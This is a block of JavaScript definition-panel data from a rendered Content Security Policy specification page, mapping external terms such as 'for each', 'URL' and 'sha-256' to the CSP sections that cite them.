        window.dfnpanelData['ae8def21'] = { "dfnID": "ae8def21", "url": "https://infra.spec.whatwg.org/#list-contain", "dfnText": "contain", "refSections": [{ "refs": [{ "id": "ref-for-list-contain" }], "title": "2.2. Policies" }, { "refs": [{ "id": "ref-for-list-contain\u2460" }], "title": "4.2.3. \n    Should element\u2019s inline type behavior be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-list-contain\u2461" }], "title": "4.4.1. \n    EnsureCSPDoesNotBlockStringCompilation(realm, parameterStrings, bodyString, codeString, compilationType, parameterArgs, bodyArg)\n  " }], "external": true };
        window.dfnpanelData['f937b7b6'] = { "dfnID": "f937b7b6", "url": "https://infra.spec.whatwg.org/#iteration-continue", "dfnText": "continue", "refSections": [{ "refs": [{ "id": "ref-for-iteration-continue" }, { "id": "ref-for-iteration-continue\u2460" }], "title": "2.2.1. \n    Parse a serialized CSP\n  " }, { "refs": [{ "id": "ref-for-iteration-continue\u2461" }], "title": "4.3.1. \n    Should RTC connections be blocked for global?\n  " }], "external": true };
        window.dfnpanelData['a088e610'] = { "dfnID": "a088e610", "url": "https://infra.spec.whatwg.org/#javascript-string-convert", "dfnText": "convert", "refSections": [{ "refs": [{ "id": "ref-for-javascript-string-convert" }], "title": "6.7.3.3. \n    Does element match source list for type and source?\n  " }], "external": true };
        window.dfnpanelData['9c05f1bf'] = { "dfnID": "9c05f1bf", "url": "https://infra.spec.whatwg.org/#string-ends-with", "dfnText": "ends with", "refSections": [{ "refs": [{ "id": "ref-for-string-ends-with" }], "title": "6.7.2.10. \n    host-part matching\n  " }], "external": true };
        window.dfnpanelData['16d07e10'] = { "dfnID": "16d07e10", "url": "https://infra.spec.whatwg.org/#list-iterate", "dfnText": "for each", "refSections": [{ "refs": [{ "id": "ref-for-list-iterate" }], "title": "2.2.1. \n    Parse a serialized CSP\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2460" }, { "id": "ref-for-list-iterate\u2461" }, { "id": "ref-for-list-iterate\u2462" }], "title": "2.2.2. \n    Parse response\u2019s Content Security Policies\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2463" }], "title": "4.1.1. \n    Report Content Security Policy violations for request\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2464" }], "title": "4.1.2. \n    Should request be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2465" }, { "id": "ref-for-list-iterate\u2466" }], "title": "4.1.3. \n    Should response to request be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2467" }, { "id": "ref-for-list-iterate\u2468" }], "title": "4.2.1. \n    Run CSP initialization for a Document\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2460\u24ea" }, { "id": "ref-for-list-iterate\u2460\u2460" }], "title": "4.2.3. \n    Should element\u2019s inline type behavior be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2460\u2461" }, { "id": "ref-for-list-iterate\u2460\u2462" }, { "id": "ref-for-list-iterate\u2460\u2463" }, { "id": "ref-for-list-iterate\u2460\u2464" }], "title": "4.2.4. \n    Should navigation request of type be blocked\n    by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2460\u2465" }, { "id": "ref-for-list-iterate\u2460\u2466" }, { "id": "ref-for-list-iterate\u2460\u2467" }, { "id": "ref-for-list-iterate\u2460\u2468" }], "title": "4.2.5. \n    Should navigation response to navigation request of type\n    in target be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2461\u24ea" }, { "id": "ref-for-list-iterate\u2461\u2460" }], "title": "4.2.6. \n    Run CSP initialization for a global object\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2461\u2461" }, { "id": "ref-for-list-iterate\u2461\u2462" }], "title": "4.3.1. \n    Should RTC connections be blocked for global?\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2461\u2463" }, { "id": "ref-for-list-iterate\u2461\u2464" }], "title": "4.4.1. \n    EnsureCSPDoesNotBlockStringCompilation(realm, parameterStrings, bodyString, codeString, compilationType, parameterArgs, bodyArg)\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2461\u2465" }], "title": "4.5.1. \n  EnsureCSPDoesNotBlockWasmByteCompilationrealm\n" }, { "refs": [{ "id": "ref-for-list-iterate\u2461\u2466" }], "title": "5.5. \n    Report a violation\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2461\u2467" }], "title": "6.3.1.1. \n    Is base allowed for document?\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2461\u2468" }], "title": "6.7.2.1. \n    Does request violate policy?\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2462\u24ea" }], "title": "6.7.2.2. \n    Does resource hint request violate policy?\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2462\u2460" }], "title": "6.7.2.3. \n    Does nonce match source list?\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2462\u2461" }], "title": "6.7.2.4. \n    Does integrity metadata match source list?\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2462\u2462" }], "title": "6.7.2.7. \n    Does url match source list in origin with redirect count?\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2462\u2463" }], "title": "6.7.2.12. \n    path-part matching\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2462\u2464" }], "title": "6.7.3.1. \n    Is element nonceable?\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2462\u2465" }], "title": "6.7.3.2. \n    Does a source list allow all inline behavior for type?\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2462\u2466" }, { "id": "ref-for-list-iterate\u2462\u2467" }, { "id": "ref-for-list-iterate\u2462\u2468" }], "title": "6.7.3.3. \n    Does element match source list for type and source?\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2463\u24ea" }], "title": "6.8.4. \n    Should fetch directive execute\n  " }], "external": true };
        window.dfnpanelData['5e72f9d3'] = { "dfnID": "5e72f9d3", "url": "https://infra.spec.whatwg.org/#", "dfnText": "infra", "refSections": [{ "refs": [{ "id": "ref-for-something" }], "title": "2.1. Infrastructure" }], "external": true };
        window.dfnpanelData['7a87d819'] = { "dfnID": "7a87d819", "url": "https://infra.spec.whatwg.org/#string-is", "dfnText": "is", "refSections": [{ "refs": [{ "id": "ref-for-string-is" }], "title": "6.7.2.3. \n    Does nonce match source list?\n  " }, { "refs": [{ "id": "ref-for-string-is\u2460" }], "title": "6.7.2.4. \n    Does integrity metadata match source list?\n  " }, { "refs": [{ "id": "ref-for-string-is\u2461" }, { "id": "ref-for-string-is\u2462" }], "title": "6.7.3.3. \n    Does element match source list for type and source?\n  " }], "external": true };
        window.dfnpanelData['6b815fdd'] = { "dfnID": "6b815fdd", "url": "https://infra.spec.whatwg.org/#list-is-empty", "dfnText": "is empty", "refSections": [{ "refs": [{ "id": "ref-for-list-is-empty" }], "title": "2.3. Directives" }, { "refs": [{ "id": "ref-for-list-is-empty\u2460" }], "title": "6.7.2.7. \n    Does url match source list in origin with redirect count?\n  " }], "external": true };
        window.dfnpanelData['d8b963e8'] = { "dfnID": "d8b963e8", "url": "https://infra.spec.whatwg.org/#isomorphic-decode", "dfnText": "isomorphic decode", "refSections": [{ "refs": [{ "id": "ref-for-isomorphic-decode" }], "title": "2.2.1. \n    Parse a serialized CSP\n  " }], "external": true };
        window.dfnpanelData['f02cd417'] = { "dfnID": "f02cd417", "url": "https://infra.spec.whatwg.org/#list-iterate", "dfnText": "iterate", "refSections": [{ "refs": [{ "id": "ref-for-list-iterate" }], "title": "2.2.1. \n    Parse a serialized CSP\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2460" }, { "id": "ref-for-list-iterate\u2461" }, { "id": "ref-for-list-iterate\u2462" }], "title": "2.2.2. \n    Parse response\u2019s Content Security Policies\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2463" }], "title": "4.1.1. \n    Report Content Security Policy violations for request\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2464" }], "title": "4.1.2. \n    Should request be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2465" }, { "id": "ref-for-list-iterate\u2466" }], "title": "4.1.3. \n    Should response to request be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2467" }, { "id": "ref-for-list-iterate\u2468" }], "title": "4.2.1. \n    Run CSP initialization for a Document\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2460\u24ea" }, { "id": "ref-for-list-iterate\u2460\u2460" }], "title": "4.2.3. \n    Should element\u2019s inline type behavior be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2460\u2461" }, { "id": "ref-for-list-iterate\u2460\u2462" }, { "id": "ref-for-list-iterate\u2460\u2463" }, { "id": "ref-for-list-iterate\u2460\u2464" }], "title": "4.2.4. \n    Should navigation request of type be blocked\n    by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2460\u2465" }, { "id": "ref-for-list-iterate\u2460\u2466" }, { "id": "ref-for-list-iterate\u2460\u2467" }, { "id": "ref-for-list-iterate\u2460\u2468" }], "title": "4.2.5. \n    Should navigation response to navigation request of type\n    in target be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2461\u24ea" }, { "id": "ref-for-list-iterate\u2461\u2460" }], "title": "4.2.6. \n    Run CSP initialization for a global object\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2461\u2461" }, { "id": "ref-for-list-iterate\u2461\u2462" }], "title": "4.3.1. \n    Should RTC connections be blocked for global?\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2461\u2463" }, { "id": "ref-for-list-iterate\u2461\u2464" }], "title": "4.4.1. \n    EnsureCSPDoesNotBlockStringCompilation(realm, parameterStrings, bodyString, codeString, compilationType, parameterArgs, bodyArg)\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2461\u2465" }], "title": "4.5.1. \n  EnsureCSPDoesNotBlockWasmByteCompilationrealm\n" }, { "refs": [{ "id": "ref-for-list-iterate\u2461\u2466" }], "title": "5.5. \n    Report a violation\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2461\u2467" }], "title": "6.3.1.1. \n    Is base allowed for document?\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2461\u2468" }], "title": "6.7.2.1. \n    Does request violate policy?\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2462\u24ea" }], "title": "6.7.2.2. \n    Does resource hint request violate policy?\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2462\u2460" }], "title": "6.7.2.3. \n    Does nonce match source list?\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2462\u2461" }], "title": "6.7.2.4. \n    Does integrity metadata match source list?\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2462\u2462" }], "title": "6.7.2.7. \n    Does url match source list in origin with redirect count?\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2462\u2463" }], "title": "6.7.2.12. \n    path-part matching\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2462\u2464" }], "title": "6.7.3.1. \n    Is element nonceable?\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2462\u2465" }], "title": "6.7.3.2. \n    Does a source list allow all inline behavior for type?\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2462\u2466" }, { "id": "ref-for-list-iterate\u2462\u2467" }, { "id": "ref-for-list-iterate\u2462\u2468" }], "title": "6.7.3.3. \n    Does element match source list for type and source?\n  " }, { "refs": [{ "id": "ref-for-list-iterate\u2463\u24ea" }], "title": "6.8.4. \n    Should fetch directive execute\n  " }], "external": true };
        window.dfnpanelData['649608b9'] = { "dfnID": "649608b9", "url": "https://infra.spec.whatwg.org/#list", "dfnText": "list", "refSections": [{ "refs": [{ "id": "ref-for-list" }], "title": "2.2. Policies" }, { "refs": [{ "id": "ref-for-list\u2460" }, { "id": "ref-for-list\u2461" }], "title": "2.2.2. \n    Parse response\u2019s Content Security Policies\n  " }], "external": true };
        window.dfnpanelData['84b454ff'] = { "dfnID": "84b454ff", "url": "https://infra.spec.whatwg.org/#ordered-map", "dfnText": "ordered map", "refSections": [{ "refs": [{ "id": "ref-for-ordered-map" }], "title": "5.3. \n    Obtain the deprecated serialization of violation\n  " }], "external": true };
        window.dfnpanelData['692595fe'] = { "dfnID": "692595fe", "url": "https://infra.spec.whatwg.org/#ordered-set", "dfnText": "ordered set", "refSections": [{ "refs": [{ "id": "ref-for-ordered-set" }], "title": "2.2. Policies" }, { "refs": [{ "id": "ref-for-ordered-set\u2460" }, { "id": "ref-for-ordered-set\u2461" }], "title": "2.3. Directives" }, { "refs": [{ "id": "ref-for-ordered-set\u2462" }], "title": "2.3.1. Source Lists" }, { "refs": [{ "id": "ref-for-ordered-set\u2463" }, { "id": "ref-for-ordered-set\u2464" }], "title": "6.8.3. \n    Get fetch directive fallback list\n  " }], "external": true };
        window.dfnpanelData['4c07280e'] = { "dfnID": "4c07280e", "url": "https://infra.spec.whatwg.org/#serialize-an-infra-value-to-json-bytes", "dfnText": "serialize an infra value to json bytes", "refSections": [{ "refs": [{ "id": "ref-for-serialize-an-infra-value-to-json-bytes" }], "title": "5.3. \n    Obtain the deprecated serialization of violation\n  " }], "external": true };
        window.dfnpanelData['15e48c39'] = { "dfnID": "15e48c39", "url": "https://infra.spec.whatwg.org/#ordered-set", "dfnText": "set", "refSections": [{ "refs": [{ "id": "ref-for-ordered-set" }], "title": "2.2. Policies" }, { "refs": [{ "id": "ref-for-ordered-set\u2460" }, { "id": "ref-for-ordered-set\u2461" }], "title": "2.3. Directives" }, { "refs": [{ "id": "ref-for-ordered-set\u2462" }], "title": "2.3.1. Source Lists" }, { "refs": [{ "id": "ref-for-ordered-set\u2463" }, { "id": "ref-for-ordered-set\u2464" }], "title": "6.8.3. \n    Get fetch directive fallback list\n  " }], "external": true };
        window.dfnpanelData['0204d188'] = { "dfnID": "0204d188", "url": "https://infra.spec.whatwg.org/#list-size", "dfnText": "size", "refSections": [{ "refs": [{ "id": "ref-for-list-size" }], "title": "4.4.1. \n    EnsureCSPDoesNotBlockStringCompilation(realm, parameterStrings, bodyString, codeString, compilationType, parameterArgs, bodyArg)\n  " }, { "refs": [{ "id": "ref-for-list-size\u2460" }], "title": "6.7.2.7. \n    Does url match source list in origin with redirect count?\n  " }], "external": true };
        window.dfnpanelData['23cac254'] = { "dfnID": "23cac254", "url": "https://infra.spec.whatwg.org/#split-on-ascii-whitespace", "dfnText": "split a string on ascii whitespace", "refSections": [{ "refs": [{ "id": "ref-for-split-on-ascii-whitespace" }], "title": "2.2.1. \n    Parse a serialized CSP\n  " }], "external": true };
        window.dfnpanelData['54627f47'] = { "dfnID": "54627f47", "url": "https://infra.spec.whatwg.org/#string-starts-with", "dfnText": "starts with", "refSections": [{ "refs": [{ "id": "ref-for-string-starts-with" }], "title": "6.7.2.10. \n    host-part matching\n  " }], "external": true };
        window.dfnpanelData['7a3dbdb1'] = { "dfnID": "7a3dbdb1", "url": "https://infra.spec.whatwg.org/#strictly-split", "dfnText": "strictly split a string", "refSections": [{ "refs": [{ "id": "ref-for-strictly-split" }], "title": "2.2.1. \n    Parse a serialized CSP\n  " }, { "refs": [{ "id": "ref-for-strictly-split\u2460" }], "title": "6.7.2.12. \n    path-part matching\n  " }], "external": true };
        window.dfnpanelData['0698d556'] = { "dfnID": "0698d556", "url": "https://infra.spec.whatwg.org/#string", "dfnText": "string", "refSections": [{ "refs": [{ "id": "ref-for-string" }], "title": "2.2.1. \n    Parse a serialized CSP\n  " }, { "refs": [{ "id": "ref-for-string\u2460" }, { "id": "ref-for-string\u2461" }], "title": "2.3. Directives" }, { "refs": [{ "id": "ref-for-string\u2462" }, { "id": "ref-for-string\u2463" }], "title": "2.3.1. Source Lists" }, { "refs": [{ "id": "ref-for-string\u2464" }], "title": "2.4.1. \n    Create a violation object for global, policy, and directive\n  " }, { "refs": [{ "id": "ref-for-string\u2465" }, { "id": "ref-for-string\u2466" }], "title": "5.2. \n    Obtain the blockedURI of a violation\u2019s resource\n  " }], "external": true };
        window.dfnpanelData['a37f05fd'] = { "dfnID": "a37f05fd", "url": "https://infra.spec.whatwg.org/#strip-leading-and-trailing-ascii-whitespace", "dfnText": "strip leading and trailing ascii whitespace", "refSections": [{ "refs": [{ "id": "ref-for-strip-leading-and-trailing-ascii-whitespace" }], "title": "2.2.1. \n    Parse a serialized CSP\n  " }], "external": true };
        window.dfnpanelData['febebe0e'] = { "dfnID": "febebe0e", "url": "https://infra.spec.whatwg.org/#the-range", "dfnText": "the range", "refSections": [{ "refs": [{ "id": "ref-for-the-range" }], "title": "4.4.1. \n    EnsureCSPDoesNotBlockStringCompilation(realm, parameterStrings, bodyString, codeString, compilationType, parameterArgs, bodyArg)\n  " }], "external": true };
        window.dfnpanelData['4d5cebba'] = { "dfnID": "4d5cebba", "url": "https://w3c.github.io/reporting/#report-type", "dfnText": "report type", "refSections": [{ "refs": [{ "id": "ref-for-report-type" }], "title": "5. \n    Reporting\n  " }], "external": true };
        window.dfnpanelData['3c4b330a'] = { "dfnID": "3c4b330a", "url": "https://w3c.github.io/reporting/#visible-to-reportingobservers", "dfnText": "visible to reportingobservers", "refSections": [{ "refs": [{ "id": "ref-for-visible-to-reportingobservers" }], "title": "5. \n    Reporting\n  " }], "external": true };
        window.dfnpanelData['574c86b8'] = { "dfnID": "574c86b8", "url": "https://www.w3.org/TR/reporting-1/#reportbody", "dfnText": "ReportBody", "refSections": [{ "refs": [{ "id": "ref-for-reportbody" }], "title": "5. \n    Reporting\n  " }], "external": true };
        window.dfnpanelData['73d9f866'] = { "dfnID": "73d9f866", "url": "https://www.w3.org/TR/reporting-1/#endpoint", "dfnText": "endpoint", "refSections": [{ "refs": [{ "id": "ref-for-endpoint" }], "title": "6.5.2. report-to" }], "external": true };
        window.dfnpanelData['07d359a5'] = { "dfnID": "07d359a5", "url": "https://www.w3.org/TR/reporting-1/#generate-and-queue-a-report", "dfnText": "generate and queue a report", "refSections": [{ "refs": [{ "id": "ref-for-generate-and-queue-a-report" }], "title": "5.5. \n    Report a violation\n  " }], "external": true };
        window.dfnpanelData['546e361d'] = { "dfnID": "546e361d", "url": "https://tools.ietf.org/html/rfc3986#section-3.3", "dfnText": "path-absolute", "refSections": [{ "refs": [{ "id": "ref-for-section-3.3" }, { "id": "ref-for-section-3.3\u2460" }], "title": "2.3.1. Source Lists" }], "external": true };
        window.dfnpanelData['01149665'] = { "dfnID": "01149665", "url": "https://tools.ietf.org/html/rfc3986#section-3.1", "dfnText": "scheme", "refSections": [{ "refs": [{ "id": "ref-for-section-3.1" }, { "id": "ref-for-section-3.1\u2460" }], "title": "2.3.1. Source Lists" }], "external": true };
        window.dfnpanelData['cdec7b52'] = { "dfnID": "cdec7b52", "url": "https://tools.ietf.org/html/rfc3986#section-4.1", "dfnText": "uri-reference", "refSections": [{ "refs": [{ "id": "ref-for-section-4.1" }, { "id": "ref-for-section-4.1\u2460" }, { "id": "ref-for-section-4.1\u2461" }], "title": "6.5.1. report-uri" }], "external": true };
        window.dfnpanelData['af6109ae'] = { "dfnID": "af6109ae", "url": "https://tools.ietf.org/html/rfc4648#section-4", "dfnText": "base64 encoding", "refSections": [{ "refs": [{ "id": "ref-for-section-4" }], "title": "2.3.1. Source Lists" }, { "refs": [{ "id": "ref-for-section-4\u2460" }, { "id": "ref-for-section-4\u2461" }], "title": "6.7.3.3. \n    Does element match source list for type and source?\n  " }], "external": true };
        window.dfnpanelData['fe4f8855'] = { "dfnID": "fe4f8855", "url": "https://tools.ietf.org/html/rfc4648#section-5", "dfnText": "base64url encoding", "refSections": [{ "refs": [{ "id": "ref-for-section-5" }], "title": "2.3.1. Source Lists" }, { "refs": [{ "id": "ref-for-section-5\u2460" }], "title": "6.7.3.3. \n    Does element match source list for type and source?\n  " }], "external": true };
        window.dfnpanelData['41a7917e'] = { "dfnID": "41a7917e", "url": "https://tools.ietf.org/html/rfc5234#appendix-B.1", "dfnText": "alpha", "refSections": [{ "refs": [{ "id": "ref-for-appendix-B.1" }, { "id": "ref-for-appendix-B.1\u2460" }, { "id": "ref-for-appendix-B.1\u2461" }, { "id": "ref-for-appendix-B.1\u2462" }, { "id": "ref-for-appendix-B.1\u2463" }, { "id": "ref-for-appendix-B.1\u2464" }, { "id": "ref-for-appendix-B.1\u2465" }], "title": "2.3. Directives" }, { "refs": [{ "id": "ref-for-appendix-B.1\u2466" }, { "id": "ref-for-appendix-B.1\u2467" }, { "id": "ref-for-appendix-B.1\u2468" }, { "id": "ref-for-appendix-B.1\u2460\u24ea" }, { "id": "ref-for-appendix-B.1\u2460\u2460" }], "title": "2.3.1. Source Lists" }], "external": true };
        window.dfnpanelData['702d8ead'] = { "dfnID": "702d8ead", "url": "https://tools.ietf.org/html/rfc5234#appendix-B.1", "dfnText": "digit", "refSections": [{ "refs": [{ "id": "ref-for-appendix-B.1" }, { "id": "ref-for-appendix-B.1\u2460" }, { "id": "ref-for-appendix-B.1\u2461" }, { "id": "ref-for-appendix-B.1\u2462" }, { "id": "ref-for-appendix-B.1\u2463" }, { "id": "ref-for-appendix-B.1\u2464" }, { "id": "ref-for-appendix-B.1\u2465" }], "title": "2.3. Directives" }, { "refs": [{ "id": "ref-for-appendix-B.1\u2466" }, { "id": "ref-for-appendix-B.1\u2467" }, { "id": "ref-for-appendix-B.1\u2468" }, { "id": "ref-for-appendix-B.1\u2460\u24ea" }, { "id": "ref-for-appendix-B.1\u2460\u2460" }], "title": "2.3.1. Source Lists" }], "external": true };
        window.dfnpanelData['c6544229'] = { "dfnID": "c6544229", "url": "https://tools.ietf.org/html/rfc5234#appendix-B.1", "dfnText": "vchar", "refSections": [{ "refs": [{ "id": "ref-for-appendix-B.1" }, { "id": "ref-for-appendix-B.1\u2460" }, { "id": "ref-for-appendix-B.1\u2461" }, { "id": "ref-for-appendix-B.1\u2462" }, { "id": "ref-for-appendix-B.1\u2463" }, { "id": "ref-for-appendix-B.1\u2464" }, { "id": "ref-for-appendix-B.1\u2465" }], "title": "2.3. Directives" }, { "refs": [{ "id": "ref-for-appendix-B.1\u2466" }, { "id": "ref-for-appendix-B.1\u2467" }, { "id": "ref-for-appendix-B.1\u2468" }, { "id": "ref-for-appendix-B.1\u2460\u24ea" }, { "id": "ref-for-appendix-B.1\u2460\u2460" }], "title": "2.3.1. Source Lists" }], "external": true };
        window.dfnpanelData['11d73a3a'] = { "dfnID": "11d73a3a", "url": "https://tools.ietf.org/html/rfc9110#section-5.6.3", "dfnText": "ows", "refSections": [{ "refs": [{ "id": "ref-for-section-5.6.3" }], "title": "2.1. Infrastructure" }], "external": true };
        window.dfnpanelData['129a3698'] = { "dfnID": "129a3698", "url": "https://tools.ietf.org/html/rfc9110#section-3.2", "dfnText": "representation", "refSections": [{ "refs": [{ "id": "ref-for-section-3.2" }], "title": "3. \n    Policy Delivery\n  " }, { "refs": [{ "id": "ref-for-section-3.2\u2460" }], "title": "3.1. \n    The Content-Security-Policy HTTP Response Header Field\n  " }, { "refs": [{ "id": "ref-for-section-3.2\u2461" }], "title": "3.2. \n    The Content-Security-Policy-Report-Only HTTP Response Header Field\n  " }], "external": true };
        window.dfnpanelData['6dc09e8a'] = { "dfnID": "6dc09e8a", "url": "https://tools.ietf.org/html/rfc9110#section-3.2", "dfnText": "resource representation", "refSections": [{ "refs": [{ "id": "ref-for-section-3.2" }], "title": "3. \n    Policy Delivery\n  " }, { "refs": [{ "id": "ref-for-section-3.2\u2460" }], "title": "3.1. \n    The Content-Security-Policy HTTP Response Header Field\n  " }, { "refs": [{ "id": "ref-for-section-3.2\u2461" }], "title": "3.2. \n    The Content-Security-Policy-Report-Only HTTP Response Header Field\n  " }], "external": true };
        window.dfnpanelData['f07429d2'] = { "dfnID": "f07429d2", "url": "https://tools.ietf.org/html/rfc9110#section-5.6.2", "dfnText": "token", "refSections": [{ "refs": [{ "id": "ref-for-section-5.6.2" }, { "id": "ref-for-section-5.6.2\u2460" }], "title": "6.3.2. sandbox" }, { "refs": [{ "id": "ref-for-section-5.6.2\u2461" }], "title": "6.5.2. report-to" }], "external": true };
        window.dfnpanelData['570073d7'] = { "dfnID": "570073d7", "url": "https://www.w3.org/TR/service-workers/#serviceworker", "dfnText": "ServiceWorker", "refSections": [{ "refs": [{ "id": "ref-for-serviceworker" }], "title": "6.1.1. child-src" }, { "refs": [{ "id": "ref-for-serviceworker\u2460" }], "title": "6.2.2. worker-src" }], "external": true };
        window.dfnpanelData['c6be056c'] = { "dfnID": "c6be056c", "url": "https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.180-4.pdf#", "dfnText": "sha-256", "refSections": [{ "refs": [{ "id": "ref-for-something\u2460" }, { "id": "ref-for-something\u2461" }, { "id": "ref-for-something\u2462" }], "title": "6.7.3.3. \n    Does element match source list for type and source?\n  " }], "external": true };
        window.dfnpanelData['7da56b7d'] = { "dfnID": "7da56b7d", "url": "https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.180-4.pdf#", "dfnText": "sha-384", "refSections": [{ "refs": [{ "id": "ref-for-something\u2460" }, { "id": "ref-for-something\u2461" }, { "id": "ref-for-something\u2462" }], "title": "6.7.3.3. \n    Does element match source list for type and source?\n  " }], "external": true };
        window.dfnpanelData['b1dc7351'] = { "dfnID": "b1dc7351", "url": "https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.180-4.pdf#", "dfnText": "sha-512", "refSections": [{ "refs": [{ "id": "ref-for-something\u2460" }, { "id": "ref-for-something\u2461" }, { "id": "ref-for-something\u2462" }], "title": "6.7.3.3. \n    Does element match source list for type and source?\n  " }], "external": true };
        window.dfnpanelData['49412eb8'] = { "dfnID": "49412eb8", "url": "https://www.w3.org/TR/trusted-types/#abstract-opdef-get-trusted-type-compliant-string", "dfnText": "Get Trusted Type compliant string", "refSections": [{ "refs": [{ "id": "ref-for-abstract-opdef-get-trusted-type-compliant-string" }], "title": "4.4.1. \n    EnsureCSPDoesNotBlockStringCompilation(realm, parameterStrings, bodyString, codeString, compilationType, parameterArgs, bodyArg)\n  " }], "external": true };
        window.dfnpanelData['605640df'] = { "dfnID": "605640df", "url": "https://www.w3.org/TR/trusted-types/#trustedscript", "dfnText": "TrustedScript", "refSections": [{ "refs": [{ "id": "ref-for-trustedscript" }, { "id": "ref-for-trustedscript\u2460" }, { "id": "ref-for-trustedscript\u2461" }, { "id": "ref-for-trustedscript\u2462" }], "title": "4.4.1. \n    EnsureCSPDoesNotBlockStringCompilation(realm, parameterStrings, bodyString, codeString, compilationType, parameterArgs, bodyArg)\n  " }], "external": true };
        window.dfnpanelData['c21b1fe2'] = { "dfnID": "c21b1fe2", "url": "https://www.w3.org/TR/trusted-types/#trustedscript-data", "dfnText": "data", "refSections": [{ "refs": [{ "id": "ref-for-trustedscript-data" }, { "id": "ref-for-trustedscript-data\u2460" }, { "id": "ref-for-trustedscript-data\u2461" }], "title": "4.4.1. \n    EnsureCSPDoesNotBlockStringCompilation(realm, parameterStrings, bodyString, codeString, compilationType, parameterArgs, bodyArg)\n  " }], "external": true };
        window.dfnpanelData['f06432d7'] = { "dfnID": "f06432d7", "url": "https://url.spec.whatwg.org/#url", "dfnText": "URL", "refSections": [{ "refs": [{ "id": "ref-for-url" }, { "id": "ref-for-url\u2460" }, { "id": "ref-for-url\u2461" }, { "id": "ref-for-url\u2462" }, { "id": "ref-for-url\u2463" }], "title": "2.4. Violations" }, { "refs": [{ "id": "ref-for-url\u2464" }], "title": "6.3.1. base-uri" }, { "refs": [{ "id": "ref-for-url\u2465" }], "title": "6.3.1.1. \n    Is base allowed for document?\n  " }, { "refs": [{ "id": "ref-for-url\u2466" }], "title": "6.4.1. form-action" }, { "refs": [{ "id": "ref-for-url\u2467" }], "title": "6.4.2. frame-ancestors" }, { "refs": [{ "id": "ref-for-url\u2468" }], "title": "6.7.2.7. \n    Does url match source list in origin with redirect count?\n  " }, { "refs": [{ "id": "ref-for-url\u2460\u24ea" }], "title": "6.7.2.8. \n    Does url match expression in origin with redirect count?\n  " }], "external": true };
        window.dfnpanelData['b9d1df32'] = { "dfnID": "b9d1df32", "url": "https://url.spec.whatwg.org/#concept-base-url", "dfnText": "base url", "refSections": [{ "refs": [{ "id": "ref-for-concept-base-url" }], "title": "5.5. \n    Report a violation\n  " }], "external": true };
        window.dfnpanelData['12553145'] = { "dfnID": "12553145", "url": "https://url.spec.whatwg.org/#default-port", "dfnText": "default port", "refSections": [{ "refs": [{ "id": "ref-for-default-port" }], "title": "6.7.2.8. \n    Does url match expression in origin with redirect count?\n  " }, { "refs": [{ "id": "ref-for-default-port\u2460" }], "title": "6.7.2.11. \n    port-part matching\n  " }], "external": true };
        window.dfnpanelData['22477314'] = { "dfnID": "22477314", "url": "https://url.spec.whatwg.org/#concept-domain", "dfnText": "domain", "refSections": [{ "refs": [{ "id": "ref-for-concept-domain" }], "title": "6.7.2.10. \n    host-part matching\n  " }], "external": true };
        window.dfnpanelData['ed948033'] = { "dfnID": "ed948033", "url": "https://url.spec.whatwg.org/#concept-url-fragment", "dfnText": "fragment", "refSections": [{ "refs": [{ "id": "ref-for-concept-url-fragment" }], "title": "5.4. Strip URL for use in reports" }], "external": true };
        window.dfnpanelData['752d140b'] = { "dfnID": "752d140b", "url": "https://url.spec.whatwg.org/#concept-host", "dfnText": "host", "refSections": [{ "refs": [{ "id": "ref-for-concept-host" }, { "id": "ref-for-concept-host\u2460" }], "title": "6.7.2.10. \n    host-part matching\n  " }], "external": true };
